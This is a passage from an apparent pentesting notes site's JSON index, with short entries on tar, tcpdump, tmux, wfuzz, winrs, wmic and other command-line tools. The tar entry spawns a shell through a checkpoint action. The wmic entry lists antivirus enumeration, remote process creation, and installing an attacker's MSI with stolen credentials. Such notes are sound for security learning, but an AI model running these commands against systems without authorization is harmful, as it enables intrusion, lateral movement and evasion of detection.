Domain&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;(Non-AD joined machines will almost always use WORKGROUP for the &lt;code&gt;Domain&lt;/code&gt;, while AD-joined machines will often use a fully qualified DNS domain here.)&lt;/p&gt;"},"spells/tar":{"slug":"spells/tar","filePath":"spells/tar.md","title":"tar","links":[],"tags":["Application/tar","AttackCycle/Exploitation"],"content":"Tar can be configured to execute an action for every N files processed using the --checkpoint and --checkpoint-action flags. So this will get us a shell:\ntar -cf /dev/null /dev/null \\\n    --checkpoint=1 --checkpoint-action=exec=/bin/sh\nThis works with any input/output file (not just /dev/null), and with any executable binary (such as a reverse shell).","richContent":"&lt;p&gt;Tar can be configured to execute an action for every N files processed using the &lt;code&gt;--checkpoint&lt;/code&gt; and &lt;code&gt;--checkpoint-action&lt;/code&gt; flags. So &lt;a href=&quot;https://gtfobins.github.io/gtfobins/tar/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;this will get us a shell&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;tar&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -cf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev/null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /dev/null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;    --checkpoint=1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --checkpoint-action=exec=/bin/sh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This works with any input/output file (not just /dev/null), and with any executable binary (such as a reverse shell).&lt;/p&gt;"},"spells/tcpdump":{"slug":"spells/tcpdump","filePath":"spells/tcpdump.md","title":"tcpdump","links":["spells/Wireshark"],"tags":["Application/tcpdump","Application/Wireshark","AttackCycle/Reconnaissance"],"content":"# Quick-n-dirty packet capture\n#\nsudo tcpdump port $PORT_TO_FILTER_ON -A\nThe -A flag prints packet contents in ASCII. Wireshark is obviously nicer.","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Quick-n-dirty packet capture&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; tcpdump&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; port&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PORT_TO_FILTER_ON&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -A&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The &lt;code&gt;-A&lt;/code&gt; flag prints packet contents in ASCII. &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Wireshark&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Wireshark&quot;&gt;Wireshark&lt;/a&gt; is obviously nicer.&lt;/p&gt;"},"spells/tmux":{"slug":"spells/tmux","filePath":"spells/tmux.md","title":"tmux","links":[],"tags":["Application/tmux"],"content":"tmux maintains its own copy buffer; when mouse support is turned on, highlighted text will be saved there rather than the system clipboard. However, it’s relatively easy to access this data.\n# Output current save buffer to STDOUT.\n#\ntmux save-buffer -\n \n# Push tmux save buffer to system clipboard on Linux.\n#\ntmux save-buffer - | xclip -selection clipboard\n \n# Push tmux save buffer to system clipboard on macOS.\n#\ntmux save-buffer - | pbcopy","richContent":"&lt;p&gt;tmux maintains its own copy buffer; when mouse support is turned on, highlighted text will be saved there rather than the system clipboard. However, it’s relatively easy to access this data.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Output current save buffer to STDOUT.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;tmux&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; save-buffer&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; -&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Push tmux save buffer to system clipboard on Linux.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;tmux&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; save-buffer&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; xclip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -selection&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; clipboard&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Push tmux save buffer to system clipboard on macOS.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;tmux&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; save-buffer&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; pbcopy&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/unbuffer":{"slug":"spells/unbuffer","filePath":"spells/unbuffer.md","title":"unbuffer","links":[],"tags":["Application/unbuffer","Application/tee"],"content":"Normally application output is printed to STDOUT whenever a newline is encountered (“line buffering”). However, line buffering is disabled when piping to another application. This is particularly annoying, for example, when piping the output of an application to tee in order to both observe and save it to a log.\nThe unbuffer command restores line buffering in pipes. Use like so:\nunbuffer $APPLICATION | tee $LOG","richContent":"&lt;p&gt;Normally application output is printed to STDOUT whenever a newline is encountered (“line buffering”). However, line buffering is disabled when piping to another application. This is particularly annoying, for example, when piping the output of an application to tee in order to both observe &lt;em&gt;and&lt;/em&gt; save it to a log.&lt;/p&gt;\n&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/11337041/force-line-buffering-of-stdout-in-a-pipeline#comment111940075_11337310&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;The unbuffer command restores line buffering in pipes.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Use like so:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;unbuffer&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $APPLICATION&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; tee&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $LOG&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/wfuzz":{"slug":"spells/wfuzz","filePath":"spells/wfuzz.md","title":"wfuzz","links":["spells/Burp-Suite"],"tags":["Application/wfuzz","AttackCycle/Reconnaissance/Fuzzing","Application/BurpSuite"],"content":"wfuzz is a URL fuzzer — basically the command-line version of the Burp Suite Intruder (but it’s much faster, which is what one would generally expect from a command-line tool).\n\n-c — Use color\n-z — Specify the wordlist that will replace FUZZ in the request\n\nBasically, the word “FUZZ” in the URL will be replaced by elements of the wordlist specified by -z. Multiple slots can be specified using “FUZ2Z”, “FUZ3Z”, etc.\nwfuzz -z file,rockyou.txt \\\n         example.com/FUZZ/img/secret.webp\nUse wfuzz --help for a full list of options. The --hc 404 option is particularly useful for hiding pages that return a 404.","richContent":"&lt;p&gt;wfuzz is a URL fuzzer — basically the command-line version of the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt; Intruder (but it’s &lt;em&gt;much&lt;/em&gt; faster, which is what one would generally expect from a command-line tool).&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;-c&lt;/code&gt; — Use color&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-z&lt;/code&gt; — Specify the wordlist that will replace FUZZ in the request&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Basically, the word “FUZZ” in the URL will be replaced by elements of the wordlist specified by &lt;code&gt;-z&lt;/code&gt;. Multiple slots can be specified using “FUZ2Z”, “FUZ3Z”, etc.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;wfuzz&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -z&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; file,rockyou.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;         https://example.com/FUZZ/img/secret.webp&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Use &lt;code&gt;wfuzz --help&lt;/code&gt; for a full list of options. The &lt;code&gt;--hc 404&lt;/code&gt; option is particularly useful for hiding pages that return a 404.&lt;/p&gt;"},"spells/whoami":{"slug":"spells/whoami","filePath":"spells/whoami.md","title":"whoami","links":[],"tags":["Application/whoami","OS/Linux","OS/macOS","OS/AIX","OS/Windows"],"content":"The whoami command is found on both *NIX and Windows systems. On Windows it supports a couple of useful flags:\n\n/all — return detailed user information\n/groups — return the current user’s groups\n/privs — return information about current user privileges\n","richContent":"&lt;p&gt;The whoami command is found on both *NIX and Windows systems. On Windows it supports a couple of useful flags:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;/all&lt;/code&gt; — return detailed user information&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;/groups&lt;/code&gt; — return the current user’s groups&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;/privs&lt;/code&gt; — return information about current user privileges&lt;/li&gt;\n&lt;/ul&gt;"},"spells/winrs":{"slug":"spells/winrs","filePath":"spells/winrs.md","title":"winrs","links":["spells/Windows-Remote-Management","spells/Use-WinRM-with-PowerShell"],"tags":["OS/Windows","Application/winrs","Protocol/WinRM","Application/PowerShell"],"content":"winrs.exe is an older application used to interact with WinRM.\nwinrs.exe -u:$TARGET_USER `\n          -p:$TARGET_PASSWORD `\n          -r:$TARGET_HOST $COMMAND\nThis interface has been largely deprecated in favor of using PowerShell, and may not even be present on recent versions of Windows.","richContent":"&lt;p&gt;winrs.exe is an older application used to interact with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Windows-Remote-Management&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Windows-Remote-Management&quot;&gt;WinRM&lt;/a&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;winrs.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;u:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;          -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;p:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_PASSWORD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;          -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;r:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;COMMAND&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This interface has been largely deprecated in favor of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Use-WinRM-with-PowerShell&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Use-WinRM-with-PowerShell&quot;&gt;using PowerShell&lt;/a&gt;, and may not even be present on recent versions of Windows.&lt;/p&gt;"},"spells/wmic":{"slug":"spells/wmic","filePath":"spells/wmic.md","title":"wmic","links":[],"tags":["OS/Windows","Application/wmic","Application/WindowsExploitSuggester","AttackCycle/Reconnaissance","AttackCycle/Exploitation","AttackCycle/LateralMovement","Application/PowerShell"],"content":"The wmic command on Windows is extremely useful, but is also deprecated (because of its usefulness to attackers!). It can be used on Windows 10 21H1 and earlier. For later systems, PowerShell command-lets will need to be used instead (which increases the risk that activity will be logged).\n\nwmic product get name,version,vendor — list all installed software (but misses 32-bit applications installed on a 64-bit OS)\nwmic service get name,displayname,pathname,startmode — list all services\nwmic qfe get caption,description,hotfixid,installedon — list installed updates\nwimc service list brief — another way of listing services\nwmic service where &quot;name like &#039;$SERVICE_NAME&#039;&quot; get name,pathname — get information about a particular service\nwmic /namespace:\\root\\securitycenter2 path antivirusproduct — enumerate antivirus\nwmic useraccount get name,sid — Display SIDs for all (local) users\n\nRemote process creation\nwmic.exe /user:$TARGET_USER `\n         /password:$TARGET_PASSWORD `\n         /node:$TARGET_HOST `\n    process call create &quot;$SOME_COMMAND&quot;\nInstall an MSI package\nwmic.exe /user:$TARGET_USER `\n         /password:$TARGET_PASSWORD `\n         /node:$TARGET_HOST `\n    product call install PackageLocation=$PATH_TO_ATTACKER_MSI","richContent":"&lt;p&gt;The wmic command on Windows is extremely useful, but is also deprecated (&lt;em&gt;because&lt;/em&gt; of its usefulness to attackers!). It can be used on Windows 10 21H1 and earlier. For later systems, PowerShell command-lets will need to be used instead (which increases the risk that activity will be logged).&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;wmic product get name,version,vendor&lt;/code&gt; — list all installed software (but misses 32-bit applications installed on a 64-bit OS)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;wmic service get name,displayname,pathname,startmode&lt;/code&gt; — list all services&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;wmic qfe get caption,description,hotfixid,installedon&lt;/code&gt; — list installed updates&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;wimc service list brief&lt;/code&gt; — another way of listing services&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;wmic service where &quot;name like &#039;$SERVICE_NAME&#039;&quot; get name,pathname&lt;/code&gt; — get information about a particular service&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;wmic /namespace:\\root\\securitycenter2 path antivirusproduct&lt;/code&gt; — enumerate antivirus&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;wmic useraccount get name,sid&lt;/code&gt; — Display SIDs for all (local) users&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=&quot;remote-process-creation&quot;&gt;Remote process creation&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#remote-process-creation&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;wmic.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;user:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;         /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;password:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_PASSWORD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;         /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;node:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;    process&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; call create &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;SOME_COMMAND&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;install-an-msi-package&quot;&gt;Install an MSI package&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#install-an-msi-package&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;wmic.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;user:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;         /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;password:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_PASSWORD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;         /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;node:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;    product call install PackageLocation&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PATH_TO_ATTACKER_MSI&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/xxd":{"slug":"spells/xxd","filePath":"spells/xxd.md","title":"xxd","links":[],"tags":["Application/xxd","OS/Linux"],"content":"The xxd command is actually pretty standard on Linux systems.\n# 